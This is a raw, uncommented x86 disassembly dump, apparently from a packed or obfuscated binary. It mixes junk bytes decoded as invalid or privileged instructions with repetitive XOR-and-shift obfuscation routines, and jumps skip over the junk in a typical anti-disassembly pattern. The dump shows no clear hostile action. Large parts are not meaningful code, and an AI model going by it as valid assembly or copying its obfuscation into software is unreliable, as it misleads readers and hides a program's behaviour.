  407d75:	xor    cl,BYTE PTR [ecx+0x1e]
  407d78:	or     eax,0xf5b460d5
  407d7d:	test   al,0x35
  407d7f:	mov    edi,0x70c4a8aa
  407d84:	sbb    al,0xca
  407d86:	mov    esp,0x10d03645
  407d8b:	inc    eax
  407d8c:	inc    ebx
  407d8d:	mov    DWORD PTR [edi+0x7e],0xd1015a79
  407d94:	lods   al,BYTE PTR ds:[esi]
  407d95:	scas   al,BYTE PTR es:[edi]
  407d96:	and    cl,BYTE PTR [ecx-0x6c0baa04]
  407d9c:	xchg   ebp,eax
  407d9d:	(bad)  
  407d9e:	pop    edx
  407d9f:	sbb    al,BYTE PTR [edx]
  407da1:	imul   ebx,DWORD PTR [esi-0xb95742a],0xed5633aa
  407dab:	jne    0x407e2c
  407dad:	and    DWORD PTR [esi-0x54796626],ebx
  407db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407db4:	push   es
  407db5:	mov    esp,0xa515aa24
  407dba:	cli    
  407dbb:	not    BYTE PTR [ecx+ebp*4+0x6f]
  407dbf:	scas   eax,DWORD PTR es:[edi]
  407dc0:	lahf   
  407dc1:	out    0x4b,eax
  407dc3:	stos   BYTE PTR es:[edi],al
  407dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc5:	sbb    DWORD PTR [eax-0x42],esi
  407dc8:	retf   
  407dc9:	clc    
  407dca:	outs   dx,BYTE PTR ds:[esi]
  407dcb:	cmp    al,0xec
  407dcd:	adc    esp,DWORD PTR [edx-0x6a]
  407dd0:	dec    esi
  407dd1:	push   0xc6989950
  407dd6:	adc    DWORD PTR [ecx-0x7caefff2],ebx
  407ddc:	aaa    
  407ddd:	and    BYTE PTR [edi],cl
  407ddf:	ja     0x407d88
  407de1:	or     eax,0x2d5ae9bb
  407de6:	jmp    0x407dae
  407de8:	neg    DWORD PTR [edi+0x77]
  407deb:	enter  0x62f1,0x41
  407def:	je     0x407dc6
  407df1:	push   edx
  407df2:	pop    ebp
  407df3:	gs xor edi,esp
  407df6:	sahf   
  407df7:	shr    BYTE PTR [edi+eax*8+0x33da6cfd],1
  407dfe:	(bad)  
  407dff:	mov    ah,0x55
  407e01:	(bad)  
  407e02:	sti    
  407e03:	sub    ebx,DWORD PTR [edi]
  407e05:	jns    0x407e10
  407e07:	test   al,0x34
  407e09:	into   
  407e0a:	jecxz  0x407e3b
  407e0c:	dec    ecx
  407e0d:	jg     0x407d9a
  407e0f:	dec    ebp
  407e10:	or     al,0xf
  407e12:	lods   al,BYTE PTR ds:[esi]
  407e13:	enter  0xc102,0xe9
  407e17:	add    cl,BYTE PTR [ebx+0x558b084d]
  407e1d:	or     al,0x33
  407e1f:	mov    ecx,0xd2331ee1
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x422738
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x422738
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0x43
  407ec6:	mov    edi,0x65bedd72
  407ecb:	mov    esi,0xbec4bdbe
  407ed0:	mov    esi,0x8a95f2fe
  407ed5:	clc    
  407ed6:	jae    0x407f03
  407ed8:	xchg   edx,eax
  407ed9:	pop    ss
  407eda:	popa   
  407edb:	das    
  407edc:	retf   
  407edd:	sub    eax,0xa8ec1d36
  407ee2:	shl    DWORD PTR [ecx+0x10d4d783],1
  407ee8:	sub    DWORD PTR [ebx+esi*4-0x1e],eax
  407eec:	aas    
  407eed:	cwde   
  407eee:	cmp    ebp,DWORD PTR [edi-0x5fed63be]
  407ef4:	(bad)  
  407ef5:	scas   eax,DWORD PTR es:[edi]
  407ef6:	lods   eax,DWORD PTR ds:[esi]
  407ef7:	inc    ecx
  407ef8:	xchg   edx,eax
  407ef9:	sbb    ebp,ebx
  407efb:	xor    DWORD PTR [edi-0x1d],edi
  407efe:	retf   0x1b7e
  407f01:	(bad)  
  407f02:	je     0x407ec4
  407f04:	in     al,dx
  407f05:	mov    eax,0xcf1dd3e7
  407f0a:	repz or DWORD PTR [eax],esi
  407f0d:	jns    0x407f70
  407f0f:	retf   
  407f10:	cli    
  407f11:	icebp  
  407f12:	dec    ebp
  407f13:	or     eax,0x3be25b39
  407f18:	dec    eax
  407f19:	or     al,0xad
  407f1b:	mov    esp,0x1b444bf7
  407f20:	loopne 0x407f06
  407f22:	mov    edx,0x1e58d0f5
  407f27:	mov    DWORD PTR [eax],ebp
  407f29:	in     eax,dx
  407f2a:	inc    edi
  407f2b:	jg     0x407ee8
  407f2d:	not    cl
  407f2f:	xchg   esp,eax
  407f30:	icebp  
  407f31:	sbb    cl,dl
  407f33:	fdivr  DWORD PTR [edi+0x6b039c99]
  407f39:	push   esp
  407f3a:	pop    es
  407f3b:	mov    dl,0x1c
  407f3d:	cmp    bh,BYTE PTR [ebx-0x3b]
  407f40:	sahf   
  407f41:	inc    edi
  407f42:	adc    eax,DWORD PTR [ecx-0x3aaea624]
  407f48:	sub    dh,ah
  407f4a:	call   0xb0c4c40d
  407f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f50:	call   0x458d4b14
  407f55:	adc    al,0x69
  407f57:	sbb    ecx,DWORD PTR ds:[eax+0x5f783f6c]
  407f5e:	shl    BYTE PTR [ecx+0x23],1
  407f61:	ror    BYTE PTR [esi+0x33b92707],cl
  407f67:	scas   al,BYTE PTR es:[edi]
  407f68:	and    DWORD PTR [esi-0x39],edi
  407f6b:	add    bh,BYTE PTR [edi-0x5d6be2b]
  407f71:	aaa    
  407f72:	(bad)  
  407f73:	div    bl
  407f75:	or     eax,0x2613a826
  407f7a:	(bad)  
  407f7b:	mov    dh,0xd8
  407f7d:	add    dl,bl
  407f7f:	cli    
  407f80:	push   ss
  407f81:	cmc    
  407f82:	xor    DWORD PTR [ecx+eiz*8],esi
  407f85:	mov    ds:0xc2670459,al
  407f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f8b:	enter  0x22a2,0xcd
  407f8f:	mov    cl,0x66
  407f91:	sub    ebx,eax
  407f93:	les    ecx,FWORD PTR [edi]
  407f95:	and    ah,BYTE PTR [esi-0x5e4fb19b]
  407f9b:	test   eax,0x4400eb25
  407fa0:	popf   
  407fa1:	pop    ds
  407fa2:	dec    eax
  407fa3:	cmp    DWORD PTR [edx],ecx
  407fa5:	ret    
  407fa6:	mov    esi,0x5ae3145f
  407fab:	retf   0xb2bd
  407fae:	ror    DWORD PTR [edi],0x7e
  407fb1:	stos   BYTE PTR es:[edi],al
  407fb2:	test   BYTE PTR [esp+eiz*8+0x1f4f2350],al
  407fb9:	mov    bh,0xc8
  407fbb:	test   al,0x8c
  407fbd:	out    0xc9,al
  407fbf:	push   edi
  407fc0:	xor    eax,0x4af25542
  407fc5:	inc    eax
  407fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fc7:	inc    eax
  407fc8:	test   DWORD PTR [ecx],edx
  407fca:	jp     0x407fd1
  407fcc:	push   edx
  407fcd:	int3   
  407fce:	into   
  407fcf:	inc    edx
  407fd0:	and    eax,0x604254c2
  407fd5:	add    edx,DWORD PTR [esi-0x7b552fd1]
  407fdb:	xchg   cl,ch
  407fdd:	mov    eax,ds:0xb0a1c2ae
  407fe2:	adc    eax,0x2890f1fb
  407fe7:	pop    edi
  407fe8:	pop    ecx
  407fe9:	sbb    ah,BYTE PTR [edi-0x32]
  407fec:	or     eax,0x33c2c1a2
  407ff1:	pop    es
  407ff2:	paddusw mm2,mm6
  407ff5:	inc    ebp
  407ff6:	push   eax
  407ff7:	jge    0x407ffb
  407ff9:	xchg   ebp,eax
  407ffa:	scas   eax,DWORD PTR es:[edi]
  407ffb:	stos   BYTE PTR es:[edi],al
  407ffc:	popf   
  407ffd:	cwde   
  407ffe:	pop    ecx
  407fff:	shr    edi,1
  408001:	push   eax
  408002:	add    cl,ah
  408004:	jns    0x408077
  408006:	xchg   ebx,eax
  408007:	jo     0x408078
  408009:	lods   eax,DWORD PTR ds:[esi]
  40800a:	test   BYTE PTR [eax-0x12550261],cl
  408010:	fidivr WORD PTR [ecx-0x39f0fea6]
  408016:	and    al,0x80
  408018:	imul   ebx,DWORD PTR [edx],0x200949a2
  40801e:	add    eax,0x7ffed60b
  408023:	mov    edx,0x164ec0c2
  408028:	(bad)  
  408029:	sar    DWORD PTR [ebx+0x21d09617],1
  40802f:	jecxz  0x408089
  408031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408032:	inc    edx
  408033:	mov    ah,0x79
  408035:	mov    BYTE PTR [esi],bl
  408037:	stos   BYTE PTR es:[edi],al
  408038:	add    ah,BYTE PTR [ecx]
  40803a:	les    edi,FWORD PTR [edx]
  40803c:	cld    
  40803d:	mov    cl,0xd7
  40803f:	enter  0x4311,0xe1
  408043:	cmc    
  408044:	test   DWORD PTR [ebp+0x68bfd206],edi
  40804a:	and    ebx,DWORD PTR ds:0x5f6929e9
  408050:	loop   0x40807e
  408052:	les    edi,FWORD PTR [eax-0x52905820]
  408058:	adc    BYTE PTR [edx-0x2ce1c445],al
  40805e:	aam    0x8
  408060:	push   cs
  408061:	mov    ds:0x458c839d,al
  408066:	cmp    eax,0xe37f268f
  40806b:	ret    
  40806c:	jge    0x408067
  40806e:	mov    cl,0x3e
  408070:	in     eax,dx
  408071:	dec    esi
  408072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408073:	das    
  408074:	inc    ebp
  408075:	inc    ebx
  408076:	mov    edi,0x603728ee
  40807b:	inc    edi
  40807c:	fisubr WORD PTR [esi-0x2199bc16]
  408082:	mov    al,ds:0x1cf1ecd6
  408087:	clc    
  408088:	and    al,0xe9
  40808a:	fs addr16 retw 
  40808e:	push   ebx
  40808f:	jmp    0x408067
  408091:	ja     0x408036
  408093:	pop    ss
  408094:	xor    eax,0x2f1f8318
  408099:	sub    BYTE PTR [ebx-0x427c76c],al
  40809f:	loop   0x40806f
  4080a1:	daa    
  4080a2:	retf   0xccc9
  4080a5:	mov    ah,0x38
  4080a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a8:	pushf  
  4080a9:	adc    bl,ch
  4080ab:	aas    
  4080ac:	add    esi,DWORD PTR [ecx-0x58]
  4080af:	adc    BYTE PTR [edi+0x48],dh
  4080b2:	inc    edi
  4080b3:	call   0xf90c:0xc5b5d77a
  4080ba:	or     ecx,0x9202c0de
  4080c0:	xchg   edi,eax
  4080c1:	and    eax,0xab533ef0
  4080c6:	jns    0x408133
  4080c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080c9:	push   ebp
  4080ca:	retf   
  4080cb:	mov    DWORD PTR [ecx],esi
  4080cd:	mul    DWORD PTR [edi]
  4080cf:	fsubr  DWORD PTR [ecx+0xb3c6200]
  4080d5:	inc    ebx
  4080d6:	pop    ds
  4080d7:	cld    
  4080d8:	test   al,0x74
  4080da:	neg    DWORD PTR ds:0xda92a389
  4080e0:	xchg   ebx,eax
  4080e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e2:	xchg   ecx,eax
  4080e3:	mov    ebp,0xb7e0ebdc
  4080e8:	outs   dx,DWORD PTR ds:[esi]
  4080e9:	aaa    
  4080ea:	ficom  DWORD PTR [ebp-0x70e66270]
  4080f0:	fstp   DWORD PTR [edx+0x1c]
  4080f3:	jecxz  0x4080cb
  4080f5:	adc    eax,0x8881b96e
  4080fa:	mov    edi,0x3d573cec
  4080ff:	scas   al,BYTE PTR es:[edi]
  408100:	scas   al,BYTE PTR es:[edi]
  408101:	jb     0x4080b7
  408103:	push   edx
  408104:	xchg   edi,eax
  408105:	adc    al,0xac
  408107:	aad    0x79
  408109:	sub    BYTE PTR [edi-0x8816051],ah
  40810f:	ins    BYTE PTR es:[edi],dx
  408110:	adc    BYTE PTR [edx-0x6ee92891],dl
  408116:	(bad)  
  408118:	sbb    dl,dh
  40811a:	stc    
  40811b:	jmp    0xb3b7:0x91d0affc
  408122:	out    0x33,al
  408124:	and    al,0x9b
  408126:	push   edi
  408127:	mov    al,ds:0xcccfd893
  40812c:	pop    edi
  40812d:	add    eax,0xf48ee1c3
  408132:	mov    ds:0x1122eda1,al
  408137:	sub    al,0x6
  408139:	lock int 0xa4
  40813c:	lds    esi,FWORD PTR [esi-0x2ee66bdd]
  408142:	repz sbb ah,BYTE PTR [esi-0x79b3a763]
  408149:	and    DWORD PTR [ecx-0x183cb446],edx
  40814f:	inc    edi
  408150:	pop    ecx
  408151:	jb     0x408102
  408153:	push   esi
  408154:	and    al,0x3e
  408156:	arpl   WORD PTR ds:0xb81784e6,sp
  40815c:	jno    0x40817b
  40815e:	mov    edx,DWORD PTR [ebp+0x26]
  408161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408162:	data16 add ah,dl
  408165:	dec    ebx
  408166:	mov    dh,0x15
  408168:	add    ebx,DWORD PTR [ebx]
  40816a:	jp     0x408180
  40816c:	sub    al,0x70
  40816e:	inc    eax
  40816f:	adc    DWORD PTR [ecx+0xa9be9b6],esi
  408175:	rcr    DWORD PTR [ebx],cl
  408177:	xchg   ebx,eax
  408178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408179:	mov    bh,0x1b
  40817b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40817c:	cmp    al,0x37
  40817e:	xor    ebx,DWORD PTR [ebx-0x5a]
  408181:	ss cs dec eax
  408184:	sub    BYTE PTR [edx],bh
  408186:	fnstcw WORD PTR [ebx+0x4b9b6a4e]
  40818c:	cli    
  40818d:	(bad)
  408190:	rcr    BYTE PTR [esi+ebx*8],1
  408193:	ret    
  408194:	jg     0x408169
  408196:	ins    BYTE PTR es:[edi],dx
  408197:	pop    ss
  408198:	mov    ds:0x81cebc14,eax
  40819d:	jmp    0xceaf:0x4fb1d059
  4081a4:	xchg   ebp,eax
  4081a5:	(bad)  
  4081a6:	sub    eax,0x4042460f
  4081ab:	inc    edx
  4081ac:	lahf   
  4081ad:	dec    esp
  4081ae:	push   0xa5403bf1
  4081b3:	test   al,0xb6
  4081b5:	add    ah,BYTE PTR [ecx-0x46648f36]
  4081bb:	outs   dx,BYTE PTR ds:[esi]
  4081bc:	mov    ah,0x26
  4081be:	or     esp,DWORD PTR [esi]
  4081c0:	add    BYTE PTR [ecx+0x7600f5a],dl
  4081c6:	sti    
  4081c7:	mov    edx,0x199e4349
  4081cc:	pop    eax
  4081cd:	or     DWORD PTR [esi+0x4fea6490],ebx
  4081d3:	loop   0x408168
  4081d5:	js     0x408191
  4081d7:	jp     0x4081b4
  4081d9:	js     0x4081fe
  4081db:	ret    0x4cf
  4081de:	jl     0x408250
  4081e0:	xchg   edx,eax
  4081e1:	push   edi
  4081e2:	icebp  
  4081e3:	xor    eax,0x55c4e70a
  4081e8:	clc    
  4081e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ea:	mov    bh,0xd3
  4081ec:	mov    dl,0x9c
  4081ee:	repz dec ebp
  4081f0:	xchg   esp,eax
  4081f1:	je     0x40817e
  4081f3:	mov    bh,0xac
  4081f5:	dec    ebp
  4081f6:	loope  0x40818a
  4081f8:	sub    DWORD PTR [ebp-0x63],eax
  4081fb:	dec    edx
  4081fc:	out    0xbd,eax
  4081fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ff:	jecxz  0x4081ca
  408201:	sar    DWORD PTR [eax-0x22],0x8c
  408205:	(bad)  
  408206:	int    0x85
  408208:	jmp    0x70d:0xbbf485e2
  40820f:	shr    DWORD PTR [esi-0x27],cl
  408212:	sbb    cl,BYTE PTR [ebp-0x48e858b0]
  408218:	js     0x4081f3
  40821a:	dec    esi
  40821b:	mov    ds:0xa5e5842a,eax
  408220:	dec    esi
  408221:	push   esp
  408222:	pop    ecx
  408223:	pop    ds
  408224:	lahf   
  408225:	mov    DWORD PTR [ecx],ebp
  408227:	in     eax,dx
  408228:	stos   DWORD PTR es:[edi],eax
  408229:	push   ebp
  40822a:	ret    
  40822b:	jmp    0x408294
  40822d:	mov    esp,0xcb06d075
  408232:	out    0xef,eax
  408234:	or     al,0x47
  408236:	jge    0x40826f
  408238:	in     eax,0x57
  40823a:	repnz dec ebp
  40823c:	out    dx,eax
  40823d:	iret   
  40823e:	xor    BYTE PTR [ebx+0x69],dh
  408241:	and    eax,0x1d974eba
  408246:	push   eax
  408247:	dec    ecx
  408248:	adc    DWORD PTR [esi+0x10610ba7],0xcf427fcd
  408252:	gs jnp 0x40820d
  408255:	xor    edx,edx
  408257:	or     eax,edx
  408259:	add    eax,DWORD PTR ds:0x422738
  40825f:	shl    ecx,0x1e
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x422738
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	adc    ebp,DWORD PTR [ebx+0x5a]
  40844f:	sar    DWORD PTR [ebp-0x42414195],1
  408455:	les    edi,FWORD PTR [esi+0x3b44bebe]
  40845b:	fnstenv [edx]
  40845d:	and    al,0x8
  40845f:	sbb    BYTE PTR [esi-0x71],dl
  408462:	hlt    
  408463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408464:	jno    0x4084b1
  408466:	loop   0x408473
  408468:	xchg   ebx,eax
  408469:	mov    ch,bh
  40846b:	and    BYTE PTR [ecx-0x1a],bh
  40846e:	xchg   ebp,eax
  40846f:	push   esi
  408470:	rcl    BYTE PTR ds:[eax-0x5a],1
  408474:	jbe    0x4084e2
  408476:	cmp    DWORD PTR [esi+0x54],0xd9fa9db3
  40847d:	sti    
  40847e:	push   DWORD PTR ds:0x1a24bc3
  408484:	mov    ds:0x85c1d7e8,eax
  408489:	ret    0x9cc9
  40848c:	shl    DWORD PTR [esi+0x38],0x6e
  408490:	mov    ds:0xa13b4ade,eax
  408495:	lahf   
  408496:	add    eax,0xd5891eed
  40849b:	xlat   BYTE PTR cs:[ebx]
  40849d:	popa   
  40849e:	cmp    dl,BYTE PTR [edx]
  4084a0:	sub    al,0x7b
  4084a2:	nop
  4084a3:	mov    dh,0xfd
  4084a5:	repnz int 0x38
  4084a8:	sbb    DWORD PTR [edi-0x5],esi
  4084ab:	call   0xe3e2:0x8dc1772c
  4084b2:	add    ecx,esi
  4084b4:	repz pushf 
  4084b6:	iret   
  4084b7:	mov    al,0xe4
  4084b9:	clc    
  4084ba:	xor    BYTE PTR [ebp+0x5b],bh
  4084bd:	cli    
  4084be:	fild   WORD PTR [edx]
  4084c0:	mov    eax,ds:0xbd75a14b
  4084c5:	les    ecx,FWORD PTR [ecx+0x7386b15]
  4084cb:	popf   
  4084cc:	mov    cl,bl
  4084ce:	xchg   esi,eax
  4084cf:	pop    eax
  4084d0:	or     eax,0x1c97f715
  4084d5:	aas    
  4084d6:	jle    0x4084af
  4084d8:	dec    edi
  4084d9:	jnp    0x4084be
  4084db:	or     ebx,ebx
  4084dd:	scas   al,BYTE PTR es:[edi]
  4084de:	jmp    esi
  4084e0:	jae    0x4084f0
  4084e2:	mov    ah,BYTE PTR [edx+0x3e]
  4084e5:	fbld   TBYTE PTR [edx-0x4c]
  4084e8:	mov    ch,0x8d
  4084ea:	hlt    
  4084eb:	pop    edi
  4084ec:	sahf   
  4084ed:	addr16 jge 0x4084a1
  4084f0:	jae    0x40847c
  4084f2:	mov    bl,al
  4084f4:	push   edx
  4084f5:	iret   
  4084f6:	xor    dl,BYTE PTR [edi+0x4ff57dd5]
  4084fc:	aad    0x72
  4084fe:	loop   0x40850f
  408500:	xchg   ebp,eax
  408501:	inc    edi
  408502:	call   0x4e26030f
  408507:	cs or  al,0x15
  40850a:	jmp    0x64e:0xed2d5947
  408511:	sahf   
  408512:	shl    DWORD PTR [edx+0x17],1
  408515:	or     eax,0xc418161e
  40851a:	or     al,0x59
  40851c:	mov    al,0x9a
  40851e:	vhsubps ymm0,ymm6,ymm2
  408522:	lods   eax,DWORD PTR ds:[esi]
  408523:	push   ecx
  408524:	inc    edi
  408525:	cdq    
  408526:	mov    ecx,0x37439687
  40852b:	dec    ebx
  40852c:	fst    QWORD PTR [edi+0xe]
  40852f:	int3   
  408530:	mov    dl,0xf
  408532:	cmp    al,BYTE PTR [edx]
  408534:	xlat   BYTE PTR ds:[ebx]
  408535:	add    edi,0x3fdff9ef
  40853b:	pinsrw mm3,WORD PTR [ebx],0x5c
  40853f:	ret    
  408540:	inc    esp
  408541:	adc    eax,0x4834024f
  408546:	mov    ds:0xdb347a21,eax
  40854b:	push   0xffffffe5
  40854d:	sub    ebp,DWORD PTR [ebx+0x4b]
